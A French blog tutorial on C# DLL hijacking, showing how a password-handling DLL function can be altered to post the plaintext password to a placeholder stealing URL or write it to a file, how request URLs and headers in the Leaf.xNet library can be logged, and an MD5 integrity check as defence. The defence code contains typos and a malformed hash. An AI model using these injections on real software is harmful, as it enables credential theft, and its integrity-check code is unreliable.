---
title: "Pourquoi il faut sécuriser vos DLL P1"
date: 2021-10-25T12:00:00Z
description: "Voici comment Détourner une DLL C# Part1"
categories: ["articles"]
tags: ["reverse","tuto"]
keywords: ["tuto", "reverse", "dotnet", ".net","ctf","dll","hijacked","dll hijacking"]
---

## Introduction
Une DLL (Dynamic Link Library) est une bibliothèque logicielle qui permet le partage, par des programmes, de codes.
Pour résumer, c'est une bibliothèque avec plusieurs fonctions à l'intérieur. C'est très utile pour ne pas toujours coder la même chose.
On code une fois la DLL et on a plus qu'a appelé ses fonctions dans tous ses projets.
L'avantage du C# est qu'il existe un grand nombre de bibliothèques, et la plupart sont Open-Source, sur GitHub principalement

### DLL Hijacking
Tout le problème est que ces DLL sont vulnérables à toutes modifications extérieurs et peuvent mener à de gros soucis sur l'assembly attaqué.
Le but d'une Dll Hijacking est de remplacé la véritable bibliothèque par une dll modifiée portant le même nom. Il faut donc conserver toutes les fonctions présentes sur l'original et y rajouter votre code à l'intérieur.

*Exemple*:
*Imaginons une application qui gère nos mots de passes. L'application est très sécurisée et il semble impossible de retrouver le code source .*
*Malheureusement celle-ci ne vérifie pas l'intégrité de sa DLL qui chiffre les mot de passe .On peut donc modifier sa DLL comme ceci :*

```C#
public static void CHIFFREMENT (string motdepasse,string clé)
{
  Mon algorithme de chiffrement super sécurisée
}
```
**Devient :**

```C#
public static void CHIFFREMENT(string motdepasse,string clé)
{
  HttpClient client = new HttpClient()
  var postdata = new Dictionary<string, string>{{ "MDP_Volé", motdepasse },};
  client.PostAsync("https://MON-URL-Pour-VOLER-LE-MDP", new FormUrlEncodedContent(postdata));

  Mon algorithme de chiffrement super sécurisée
}
```
**ou :**

```C#
public static void CHIFFREMENT(string motdepasse,string clé)
{
  File.AppendAllText("stealed.txt", motdepasse + "\n");
  Mon algorithme de chiffrement super sécurisée
}
```
Il reste à re-compiler la DLL et à remplacer celle d'origne par la votre.

#### Un cas plus concret :

Prenons l'exemple de *[Leaf.Xnet](https://github.com/csharp-leaf/Leaf.xNet)*.  
Cette bibliothèque est très souvent utilisé car elle permet de faire des requêtes WEB rapidement est facilement en C#.
Regardons de plus prêt la fonction *Get (l. 872)*  

![Alt text](./img/hijacked.png "hijacked")

On enregistre les url appelés .
*Le code malveillant serait celui-ci*
````Csharp
       try
       {
              File.AppendAllText("RequestHijacked.txt", "GET // : URL --> " + address.ToString() + "\n");
       }
       catch (Exception ex)
       {
              Console.WriteLine("Hidjack Error : " + ex.Message);
       }
````
On pourrait aussi faire ca pour toutes les fonctions de requêtes , la fonction qui ajoute des Headers etc. ...

*(AddHeader l. 1658)*
```Csharp
       try
       {
           File.AppendAllText("RequestHijacked.txt", "HEADER // : name --> " + name.ToString());
           File.AppendAllText("RequestHijacked.txt", " : " + value.ToString() + "\n");
       }
       catch (Exception ex)
       {
            Console.WriteLine("Hidjack Error : " + ex.Message);
       }

```

Voici ma Dll [ma Dll Leaf.Xnet.dll](./files/Leaf.xNet.dll) 
Ainsi, on pourrait log toutes les requètes effectuées par notre application, même si l'application entière semble sécurisée.


### Comment faire si la DLL n'est pas visible/Open source.
Il est possible que l'assembly que vous visez soit packé . En lien avec l'article précédent , vous pouvez essayer de DUMP le processus quand il est lancé pour récupérer la DLL et le .exe séparément.  

Avec DNSpy, vous pouvez reconstruire un projet visual studio à partir d'un executable .NET
*(Vous devrez donc corriger les quelques erreurs de code pour la recompiler mais cella permet d'avoir un code source approximatif.)*

Pour créer le projet à partir de la DLL :
- Ouvrez votre DLL dans *DnSpy*
- Sélectionner la en cliquant dessus
- Cliquez sur *Fichier* puis *Exporter vers le Projet*

## Comment s'en protéger ?

La manière la plus simple est d'écrire dans le code du programme directement le Hash MD5 de la DLL.
On peut calculer un Hash pour chaque dépendance et ainsi vérifier l'intégrité d'une DLL :

```C#
  public static void checkDLL()
  {
    if (MD5("MADLL.dll") != "799EF18FFMA0E270CEFPA8194D19F8PM")
      Process.GetCurrentProcess().Kill();
  }

  public static string MD5(string path)
  {
    if (!File.Exists(path))
      return "empty";
    else
      {
        FileStream running = File.OpenRead(path);
        byte[] exeBytes = new byte[running.Length];
        unning.Read(exeBytes, 0, exeBytes.Length);
        running.Close();
        MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider();
        byte[] originalBytes = ASCIIEncoding.Default.GetBytes(ASCIIEncoding.ASCII.GetString(exeBytes));
        byte[] encodedBytes = md5.ComputeHash(originalBytes);
        return BitConverter.ToString(encodedBytes).Replace("-", "");
        }
  }
```
[Et voici mon programme qui renvoie le MD5 d'une DLL :](./files/GetHash.exe)
